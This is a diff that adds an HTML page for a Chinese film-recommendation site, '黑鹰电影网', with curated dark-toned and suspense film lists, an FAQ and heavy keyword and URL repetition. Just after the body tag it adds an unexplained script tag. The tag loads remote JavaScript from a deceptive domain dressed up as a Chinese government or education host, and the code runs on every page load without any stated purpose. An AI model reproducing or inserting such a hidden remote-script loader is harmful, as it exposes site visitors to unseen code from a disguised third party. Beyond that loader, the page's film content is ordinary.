@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>heiyingdianyingwang-zh.github.io｜黑鹰电影网 · 冷峻质感影像清单与放映手记</title>
+<meta name="keywords" content="heiyingdianyingwang-zh.github.io,黑鹰电影网,黑鹰电影网官方入口,黑鹰电影网在线选片,黑鹰电影网放映手记,冷色调电影推荐,暗黑系高分片单,犯罪悬疑必看榜单,小众艺术片整理,独立电影放映,周末观影计划表,电影台词金句收录,导演专题合集">
+<meta name="description" content="黑鹰电影网（https://heiyingdianyingwang-zh.github.io）以冷峻质感为选片标准，每周发布暗调高分片单、犯罪悬疑必看榜单与放映手记，把观影整理成一份有主张的清单。">
+<link rel="canonical" href="https://heiyingdianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --ink:#121416;--ink2:#171a1d;--ink3:#1e2226;--bd:#2c3137;--bd2:#3a4149;
+  --fg:#dfe2e4;--fg2:#9aa2ab;--fg3:#6b737c;--steel:#4a5a6b;--ice:#7fd1c7;--rust:#c65a3a;--bone:#d9c79a;
+}
+html{scroll-behavior:smooth}
+body{background:var(--ink);color:var(--fg);font-family:"Inter","Helvetica Neue","PingFang SC","Microsoft YaHei",sans-serif;line-height:1.75;font-size:15px;-webkit-font-smoothing:antialiased}
+a{color:inherit;text-decoration:none}
+.mono{font-family:"JetBrains Mono","SF Mono",Menlo,Consolas,monospace}
+.wrap{max-width:1040px;margin:0 auto;padding:0 22px}
+
+/* 头部 */
+header{border-bottom:1px solid var(--bd);background:var(--ink);position:sticky;top:0;z-index:80}
+header .wrap{display:flex;align-items:center;gap:26px;height:66px}
+.brand{display:flex;align-items:center;gap:11px;flex-shrink:0}
+.brand .mark{width:30px;height:30px;border:1.5px solid var(--bd2);position:relative;flex-shrink:0}
+.brand .mark::before{content:"";position:absolute;inset:5px;border-left:1.5px solid var(--rust);border-bottom:1.5px solid var(--rust);transform:rotate(-45deg);transform-origin:left bottom}
+.brand .txt{font-size:17px;font-weight:800;letter-spacing:.16em}
+.brand .txt i{font-style:normal;color:var(--rust)}
+.brand .txt small{display:block;font-size:9px;font-weight:500;letter-spacing:.24em;color:var(--fg3);margin-top:-2px}
+nav{display:flex;gap:4px;margin-left:auto;overflow-x:auto;scrollbar-width:none}
+nav::-webkit-scrollbar{display:none}
+nav a{padding:7px 13px;font-size:13px;color:var(--fg2);border-radius:2px;white-space:nowrap;letter-spacing:.04em}
+nav a:hover{color:var(--ice);background:var(--ink3)}
+nav a.cur{color:var(--ink);background:var(--bone)}
+.addr{font-size:11.5px;color:var(--fg3);white-space:nowrap;flex-shrink:0;border-left:1px solid var(--bd);padding-left:20px}
+.addr span{color:var(--bone)}
+
+/* 封面 */
+.cover{padding:64px 0 54px;border-bottom:1px solid var(--bd);position:relative;overflow:hidden}
+.cover::before{content:"黑鹰";position:absolute;right:-4px;top:-18px;font-size:150px;font-weight:900;letter-spacing:.02em;color:rgba(198,90,58,.05);line-height:1}
+.kicker{font-size:11px;letter-spacing:.32em;color:var(--rust);text-transform:uppercase;margin-bottom:18px}
+.cover h1{font-size:38px;line-height:1.3;font-weight:900;letter-spacing:-.01em;max-width:760px}
+.cover h1 em{font-style:normal;color:var(--rust)}
+.cover .sub{font-size:15px;color:var(--fg2);max-width:640px;margin-top:16px}
+.metas{display:flex;flex-wrap:wrap;gap:0;border-top:1px solid var(--bd);margin-top:38px}
+.metas div{flex:1;min-width:150px;padding:18px 22px 0;border-right:1px solid var(--bd)}
+.metas div:last-child{border-right:none}
+.metas dt{font-size:10px;letter-spacing:.2em;color:var(--fg3);text-transform:uppercase}
+.metas dd{font-size:15px;color:var(--fg);margin-top:5px}
+.metas dd a:hover{color:var(--ice);text-decoration:underline}
+
+/* 区块 */
+section{padding:58px 0;border-bottom:1px solid var(--bd)}
+.stit{display:grid;grid-template-columns:56px 1fr auto;align-items:end;gap:16px;margin-bottom:30px}
+.stit .no{font-size:12px;color:var(--rust);font-family:"JetBrains Mono",monospace;letter-spacing:.1em;padding-bottom:6px}
+.stit h2{font-size:22px;font-weight:800;letter-spacing:.02em}
+.stit .en{font-size:10px;letter-spacing:.28em;color:var(--fg3);text-transform:uppercase;padding-bottom:8px;text-align:right}
+.stit .more{font-size:12px;color:var(--fg3);padding-bottom:8px}
+.stit .more:hover{color:var(--rust)}
+
+/* 时间轴 */
+.tl{position:relative;padding-left:0}
+.tl::before{content:"";position:absolute;left:50%;top:6px;bottom:6px;width:1px;background:var(--bd)}
+@media(max-width:820px){.tl::before{left:7px}}
+.tl .row{display:grid;grid-template-columns:1fr 14px 1fr;gap:0;margin-bottom:22px;align-items:start}
+@media(max-width:820px){.tl .row{grid-template-columns:22px 1fr;gap:0}}
+.tl .node{width:13px;height:13px;border:1.5px solid var(--rust);background:var(--ink);border-radius:50%;margin:8px auto 0;position:relative;z-index:2}
+@media(max-width:820px){.tl .node{margin:10px 0 0;grid-column:1}}
+.tl .panel{background:var(--ink2);border:1px solid var(--bd);padding:18px 20px;position:relative}
+@media(max-width:820px){.tl .panel{grid-column:2}}
+.tl .row:nth-child(odd) .panel{margin-right:26px}
+.tl .row:nth-child(even){direction:rtl}
+.tl .row:nth-child(even) .panel{direction:ltr;margin-left:26px}
+@media(max-width:820px){.tl .row:nth-child(odd) .panel,.tl .row:nth-child(even) .panel{margin:0 0 0 16px;direction:ltr}}
+.tl .panel .top{display:flex;align-items:center;gap:10px;font-size:11px;color:var(--fg3);margin-bottom:8px;letter-spacing:.06em}
+.tl .panel .top b{color:var(--bone);font-weight:600;font-family:"JetBrains Mono",monospace}
+.tl .panel h4{font-size:16.5px;font-weight:700;margin-bottom:6px}
+.tl .panel h4 a:hover{color:var(--ice)}
+.tl .panel p{font-size:13px;color:var(--fg2)}
+.tl .panel .go{display:inline-block;margin-top:11px;font-size:11.5px;color:var(--rust);letter-spacing:.06em}
+.tl .panel .go:hover{color:var(--ice)}
+
+/* 棋盘网格 */
+.board{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--bd);border:1px solid var(--bd)}
+@media(max-width:760px){.board{grid-template-columns:repeat(2,1fr)}}
+.board a{background:var(--ink2);padding:20px 18px;display:block;min-height:150px;transition:.2s}
+.board a:hover{background:var(--ink3);transform:translate(-2px,-2px)}
+.board a .n{font-size:10px;color:var(--rust);font-family:"JetBrains Mono",monospace;letter-spacing:.12em}
+.board a h4{font-size:15px;font-weight:700;margin:10px 0 7px}
+.board a p{font-size:12px;color:var(--fg3);line-height:1.65}
+.board a:hover h4{color:var(--ice)}
+.board a.feat{grid-column:span 2;grid-row:span 2;background:var(--ink3)}
+@media(max-width:760px){.board a.feat{grid-column:span 2;grid-row:auto}}
+.board a.feat h4{font-size:21px;margin-top:34px}
+.board a.feat p{font-size:13px;color:var(--fg2)}
+
+/* 放映厅 */
+.halls{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+@media(max-width:820px){.halls{grid-template-columns:1fr}}
+.hall{border-top:3px solid var(--steel);padding-top:16px}
+.hall.rust{border-color:var(--rust)}
+.hall.bone{border-color:var(--bone)}
+.hall h4{font-size:15px;font-weight:700;display:flex;align-items:center;gap:8px;margin-bottom:3px}
+.hall h4 s{text-decoration:none;font-size:17px}
+.hall .cap{font-size:11px;color:var(--fg3);letter-spacing:.1em;margin-bottom:14px}
+.hall ol{list-style:none;counter-reset:c}
+.hall ol li{counter-increment:c;padding:11px 0;border-bottom:1px dashed var(--bd);font-size:13.5px;color:var(--fg2);display:flex;gap:12px}
+.hall ol li::before{content:"0" counter(c);font-family:"JetBrains Mono",monospace;font-size:11px;color:var(--rust);flex-shrink:0;width:22px;padding-top:3px}
+.hall ol li a:hover{color:var(--ice)}
+.hall ol li span{margin-left:auto;font-size:11px;color:var(--fg3);flex-shrink:0}
+
+/* 片单条 */
+.reels{display:flex;flex-direction:column}
+.reel{display:grid;grid-template-columns:78px 1fr 150px 88px;gap:18px;align-items:center;padding:14px 4px;border-bottom:1px solid var(--bd);font-size:14px}
+@media(max-width:760px){.reel{grid-template-columns:52px 1fr;gap:10px}.reel .yr,.reel .rt{display:none}}
+.reel:hover{background:var(--ink2)}
+.reel .idx{font-family:"JetBrains Mono",monospace;font-size:12px;color:var(--rust)}
+.reel .tt{font-weight:600}
+.reel .tt a:hover{color:var(--ice)}
+.reel .tt small{display:block;font-size:12px;color:var(--fg3);font-weight:400}
+.reel .yr{font-size:12px;color:var(--fg3);font-family:"JetBrains Mono",monospace}
+.reel .rt{font-size:12.5px;color:var(--bone);font-family:"JetBrains Mono",monospace;text-align:right}
+.reel .rt i{font-style:normal;color:var(--rust)}
+
+/* 问答 */
+.qa{display:grid;grid-template-columns:1fr 1fr;gap:0;border-top:1px solid var(--bd);border-left:1px solid var(--bd)}
+@media(max-width:760px){.qa{grid-template-columns:1fr}}
+.qa div{border-right:1px solid var(--bd);border-bottom:1px solid var(--bd);padding:22px 24px}
+.qa .q{font-size:11px;color:var(--rust);letter-spacing:.16em;margin-bottom:9px}
+.qa .a{font-size:14px;color:var(--fg2)}
+.qa .a strong{display:block;color:var(--fg);font-size:15px;font-weight:600;margin-bottom:7px}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.4fr 1fr;gap:40px;align-items:start}
+@media(max-width:820px){.about{grid-template-columns:1fr}}
+.about .lead{font-size:16px;color:var(--fg);line-height:1.9}
+.about .lead::first-letter{font-size:42px;color:var(--rust);font-weight:900;float:left;line-height:.95;padding:4px 10px 0 0}
+.about .lead a{color:var(--bone);border-bottom:1px solid var(--rust)}
+.spec{border:1px solid var(--bd)}
+.spec div{display:grid;grid-template-columns:88px 1fr;padding:12px 18px;border-bottom:1px solid var(--bd)}
+.spec div:last-child{border-bottom:none}
+.spec dt{font-size:11px;letter-spacing:.14em;color:var(--fg3)}
+.spec dd{font-size:13.5px;color:var(--fg)}
+.spec dd a{color:var(--bone)}
+.spec dd a:hover{color:var(--ice)}
+
+/* 页脚 */
+footer{background:#0d0f11;padding:48px 0 30px}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:34px}
+@media(max-width:760px){.foot{grid-template-columns:repeat(2,1fr)}}
+.foot .lg{font-size:19px;font-weight:800;letter-spacing:.14em}
+.foot .lg i{font-style:normal;color:var(--rust)}
+.foot .lg p{font-size:12.5px;color:var(--fg3);margin-top:11px;line-height:1.8;max-width:320px}
+.foot h5{font-size:10.5px;letter-spacing:.2em;color:var(--fg2);margin-bottom:13px;text-transform:uppercase}
+.foot ul{list-style:none;display:flex;flex-direction:column;gap:9px;font-size:13px;color:var(--fg3)}
+.foot a:hover{color:var(--ice)}
+.end{border-top:1px solid var(--bd);padding-top:22px;font-size:11.5px;color:var(--fg3);line-height:2;text-align:center}
+.end a{color:var(--bone)}
+.end .line{letter-spacing:.22em;margin-bottom:8px;color:var(--fg2)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="wrap">
+    <div class="brand"><div class="mark"></div><div class="txt">黑鹰<i>电影网</i><small>HEIYING FILM</small></div></div>
+    <nav>
+      <a href="#cover" class="cur">放映场</a>
+      <a href="#week">本周放映</a>
+      <a href="#files">影库档案</a>
+      <a href="#hall1">暗调精选</a>
+      <a href="#hall2">悬疑必看</a>
+      <a href="#hall3">艺术影像</a>
+      <a href="#ask">访客问答</a>
+      <a href="#about">关于本站</a>
+    </nav>
+    <div class="addr">入口 <span>heiyingdianyingwang-zh.github.io</span></div>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <div class="cover" id="cover">
+    <div class="kicker">VOL.40 · 冷调放映清单</div>
+    <h1>黑鹰电影网：<em>不做泛泛推荐</em>，只挑有主张的影像</h1>
+    <p class="sub">以冷峻质感、叙事密度与视听风格为选片标准，每周更新暗调片单、犯罪悬疑榜单与放映手记。网站网址为 <a href="https://heiyingdianyingwang-zh.github.io" style="color:#d9c79a;border-bottom:1px solid #c65a3a">https://heiyingdianyingwang-zh.github.io</a>。</p>
+    <dl class="metas">
+      <div><dt>网站名称</dt><dd>黑鹰电影网</dd></div>
+      <div><dt>访问入口</dt><dd><a href="https://heiyingdianyingwang-zh.github.io">heiyingdianyingwang-zh.github.io</a></dd></div>
+      <div><dt>更新频率</dt><dd>每周五更新</dd></div>
+      <div><dt>内容定位</dt><dd>影像选片与放映手记</dd></div>
+    </dl>
+  </div>
+
+  <section id="week">
+    <div class="stit"><div class="no">/01</div><h2>本周放映表</h2><div class="en">Now Showing</div><a class="more" href="#">查看全部 →</a></div>
+    <div class="tl">
+      <div class="row"><div class="panel">
+        <div class="top"><b>10.06 周五</b><span>院线 · 犯罪悬疑</span></div>
+        <h4><a href="#">逆光者</a></h4>
+        <p>136 分钟。靠信息差推进的双线叙事，前 40 分钟节奏偏慢，中段反转密集，适合能静下心看的观众。</p>
+        <a class="go" href="#">查看手记 →</a>
+      </div><div class="node"></div><div></div></div>
+
+      <div class="row"><div></div><div class="node"></div><div class="panel">
+        <div class="top"><b>10.05 周四</b><span>影库 · 暗黑向</span></div>
+        <h4><a href="#">老无所依</a></h4>
+        <p>122 分钟。科恩兄弟的反类型之作，反派没有动机只有原则，结尾的处理方式至今被反复讨论。</p>
+        <a class="go" href="#">查看手记 →</a>
+      </div></div>
+
+      <div class="row"><div class="panel">
+        <div class="top"><b>10.04 周三</b><span>剧集 · 刑侦</span></div>
+        <h4><a href="#">沉默的谈判者</a></h4>
+        <p>22 / 32 集。谈判专家视角切入案件，单元剧结构，单集独立成篇，通勤时段可分段看。</p>
+        <a class="go" href="#">查看手记 →</a>
+      </div><div class="node"></div><div></div></div>
+
+      <div class="row"><div></div><div class="node"></div><div class="panel">
+        <div class="top"><b>10.02 周一</b><span>影库 · 艺术影像</span></div>
+        <h4><a href="#">牺牲</a></h4>
+        <p>149 分钟。塔可夫斯基的最后一部长片，长镜头与火的元素贯穿全片，看的是氛围与信仰。</p>
+        <a class="go" href="#">查看手记 →</a>
+      </div></div>
+
+      <div class="row"><div class="panel">
+        <div class="top"><b>09.30 周六</b><span>院线 · 合家欢</span></div>
+        <h4><a href="#">白鲸与少年</a></h4>
+        <p>96 分钟。全年龄向的海洋冒险，视听完成度高于同类，大人也能看出生态保护的一层。</p>
+        <a class="go" href="#">查看手记 →</a>
+      </div><div class="node"></div><div></div></div>
+    </div>
+  </section>
+
+  <section id="files">
+    <div class="stit"><div class="no">/02</div><h2>影库档案</h2><div class="en">Film Archives</div><a class="more" href="#">进入片库 →</a></div>
+    <div class="board">
+      <a href="#" class="feat"><div class="n">FEATURED</div><h4>暗调高分片单：<br>八部适合深夜一个人看的电影</h4><p>从视听风格出发而非题材，挑出八部在色调、配乐与节奏上都有明确主张的作品，附带观看时的几点提示。</p></a>
+      <a href="#"><div class="n">A.01</div><h4>犯罪悬疑</h4><p>信息差与反转密度，共 96 部</p></a>
+      <a href="#"><div class="n">A.02</div><h4>冷调剧情</h4><p>低饱和影像，共 71 部</p></a>
+      <a href="#"><div class="n">A.03</div><h4>黑色电影</h4><p>经典与当代 neo-noir</p></a>
+      <a href="#"><div class="n">A.04</div><h4>心理惊悚</h4><p>不靠 jump scare</p></a>
+      <a href="#"><div class="n">A.05</div><h4>战争纪实</h4><p>冷峻克制向</p></a>
+      <a href="#"><div class="n">A.06</div><h4>独立制作</h4><p>小成本高表达</p></a>
+    </div>
+  </section>
+
+  <section id="hall1">
+    <div class="stit"><div class="no">/03</div><h2>暗调精选 · 三厅放映</h2><div class="en">Screening Halls</div><a class="more" href="#">更多 →</a></div>
+    <div class="halls">
+      <div class="hall rust">
+        <h4><s>◼</s>第一放映厅</h4>
+        <div class="cap">暗调精选 · 冷色与低照度</div>
+        <ol>
+          <li><a href="#">老无所依</a><span>2007</span></li>
+          <li><a href="#">血色将至</a><span>2007</span></li>
+          <li><a href="#">焦土之城</a><span>2010</span></li>
+          <li><a href="#">忧郁症</a><span>2011</span></li>
+          <li><a href="#">圣鹿之死</a><span>2017</span></li>
+        </ol>
+      </div>
+      <div class="hall">
+        <h4><s>◼</s>第二放映厅</h4>
+        <div class="cap">悬疑必看 · 反转与结构</div>
+        <ol>
+          <li><a href="#">记忆碎片</a><span>2000</span></li>
+          <li><a href="#">恐怖游轮</a><span>2009</span></li>
+          <li><a href="#">消失的爱人</a><span>2014</span></li>
+          <li><a href="#">看不见的客人</a><span>2016</span></li>
+          <li><a href="#">网络谜踪</a><span>2018</span></li>
+        </ol>
+      </div>
+      <div class="hall bone">
+        <h4><s>◼</s>第三放映厅</h4>
+        <div class="cap">艺术影像 · 长镜头与诗性</div>
+        <ol>
+          <li><a href="#">牺牲</a><span>1986</span></li>
+          <li><a href="#">潜行者</a><span>1979</span></li>
+          <li><a href="#">四月三周两天</a><span>2007</span></li>
+          <li><a href="#">都灵之马</a><span>2011</span></li>
+          <li><a href="#">大象席地而坐</a><span>2018</span></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section id="hall2">
+    <div class="stit"><div class="no">/04</div><h2>本月片单 · 十大冷调作品</h2><div class="en">Top Picks</div><a class="more" href="#">完整榜单 →</a></div>
+    <div class="reels">
+      <div class="reel"><div class="idx">01</div><div class="tt"><a href="#">老无所依</a><small>犯罪 / 西部 · 科恩兄弟</small></div><div class="yr">2007 · 122 min</div><div class="rt"><i>◆</i> 9.3</div></div>
+      <div class="reel"><div class="idx">02</div><div class="tt"><a href="#">血色将至</a><small>剧情 / 历史 · P·T·安德森</small></div><div class="yr">2007 · 158 min</div><div class="rt"><i>◆</i> 8.9</div></div>
+      <div class="reel"><div class="idx">03</div><div class="tt"><a href="#">焦土之城</a><small>剧情 / 战争 · 维伦纽瓦</small></div><div class="yr">2010 · 131 min</div><div class="rt"><i>◆</i> 8.8</div></div>
+      <div class="reel"><div class="idx">04</div><div class="tt"><a href="#">圣鹿之死</a><small>惊悚 / 荒诞 · 欧格斯·兰斯莫斯</small></div><div class="yr">2017 · 121 min</div><div class="rt"><i>◆</i> 7.8</div></div>
+      <div class="reel"><div class="idx">05</div><div class="tt"><a href="#">忧郁症</a><small>剧情 / 科幻 · 拉斯·冯·提尔</small></div><div class="yr">2011 · 130 min</div><div class="rt"><i>◆</i> 7.9</div></div>
+      <div class="reel"><div class="idx">06</div><div class="tt"><a href="#">记忆碎片</a><small>悬疑 / 犯罪 · 诺兰</small></div><div class="yr">2000 · 113 min</div><div class="rt"><i>◆</i> 8.7</div></div>
+      <div class="reel"><div class="idx">07</div><div class="tt"><a href="#">消失的爱人</a><small>悬疑 / 婚姻 · 大卫·芬奇</small></div><div class="yr">2014 · 149 min</div><div class="rt"><i>◆</i> 8.7</div></div>
+      <div class="reel"><div class="idx">08</div><div class="tt"><a href="#">看不见的客人</a><small>悬疑 / 推理 · 奥里奥尔·保罗</small></div><div class="yr">2016 · 106 min</div><div class="rt"><i>◆</i> 8.8</div></div>
+      <div class="reel"><div class="idx">09</div><div class="tt"><a href="#">潜行者</a><small>科幻 / 哲理 · 塔可夫斯基</small></div><div class="yr">1979 · 162 min</div><div class="rt"><i>◆</i> 8.9</div></div>
+      <div class="reel"><div class="idx">10</div><div class="tt"><a href="#">大象席地而坐</a><small>剧情 / 独立 · 胡波</small></div><div class="yr">2018 · 234 min</div><div class="rt"><i>◆</i> 8.1</div></div>
+    </div>
+  </section>
+
+  <section id="ask">
+    <div class="stit"><div class="no">/05</div><h2>访客问答</h2><div class="en">FAQ</div></div>
+    <div class="qa">
+      <div><div class="q">Q / 01</div><div class="a"><strong>黑鹰电影网是什么性质的站点？</strong>以选片标准与观影整理为核心的静态站点，不提供在线播放、下载或资源分享服务。</div></div>
+      <div><div class="q">Q / 02</div><div class="a"><strong>网站网址是什么？</strong>网站名称为「黑鹰电影网」，网址为 <a href="https://heiyingdianyingwang-zh.github.io" style="color:#d9c79a">https://heiyingdianyingwang-zh.github.io</a>，短写形式为 heiyingdianyingwang-zh.github.io。</div></div>
+      <div><div class="q">Q / 03</div><div class="a"><strong>「冷调」的选片标准是什么？</strong>指色调、节奏与叙事态度的整体倾向，而非只挑恐怖片；低饱和画面、慢节奏、反类型结局都在考量范围内。</div></div>
+      <div><div class="q">Q / 04</div><div class="a"><strong>更新周期与栏目结构？</strong>每周五更新一期，常设板块为本周放映表、影库档案、三厅放映、月度片单、访客问答与关于本站。</div></div>
+      <div><div class="q">Q / 05</div><div class="a"><strong>栏目链接现在能否点击？</strong>当前为单文件静态页面，内页链接以占位形式呈现，正式上线后替换为真实栏目地址即可。</div></div>
+      <div><div class="q">Q / 06</div><div class="a"><strong>片单中的评分从何而来？</strong>来自公开评分平台的聚合数值，仅作参考，不单独构成推荐理由，具体以手记中的观看提示为准。</div></div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="stit"><div class="no">/06</div><h2>关于本站</h2><div class="en">About</div></div>
+    <div class="about">
+      <p class="lead">黑鹰电影网（<a href="https://heiyingdianyingwang-zh.github.io">heiyingdianyingwang-zh.github.io</a>）希望解决的是「想看电影但不知道看什么」这件事。它不做泛泛的热门搬运，而是把影像按冷调质感、叙事密度与视听主张重新分类，让每一份片单都有自己的判断。</p>
+      <dl class="spec">
+        <div><dt>名称</dt><dd>黑鹰电影网</dd></div>
+        <div><dt>网址</dt><dd><a href="https://heiyingdianyingwang-zh.github.io">heiyingdianyingwang-zh.github.io</a></dd></div>
+        <div><dt>托管</dt><dd>静态页面 · 访问稳定</dd></div>
+        <div><dt>栏目</dt><dd>6 个常设板块</dd></div>
+        <div><dt>更新</dt><dd>每周五 · 与院线节奏同步</dd></div>
+        <div><dt>声明</dt><dd>不提供播放、下载或资源分享</dd></div>
+      </dl>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="lg">黑鹰<i>电影网</i><p>网站名称：黑鹰电影网<br>网站网址：<a href="https://heiyingdianyingwang-zh.github.io">https://heiyingdianyingwang-zh.github.io</a></p></div>
+      <div><h5>内容</h5><ul><li><a href="#week">本周放映表</a></li><li><a href="#files">影库档案</a></li><li><a href="#hall1">三厅放映</a></li><li><a href="#hall2">月度片单</a></li></ul></div>
+      <div><h5>站点</h5><ul><li><a href="#ask">访客问答</a></li><li><a href="#about">关于本站</a></li></ul></div>
+      <div><h5>入口</h5><ul><li>heiyingdianyingwang-zh.github.io</li><li>静态托管</li></ul></div>
+    </div>
+    <div class="end">
+      <div class="line">H E I Y I N G · F I L M · N O T E S</div>
+      网站名称：黑鹰电影网 ｜ 网站网址：<a href="https://heiyingdianyingwang-zh.github.io">https://heiyingdianyingwang-zh.github.io</a><br>
+      © 2026 黑鹰电影网 · 本站仅提供影像选片与放映手记，不提供在线播放、下载或资源分享服务
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
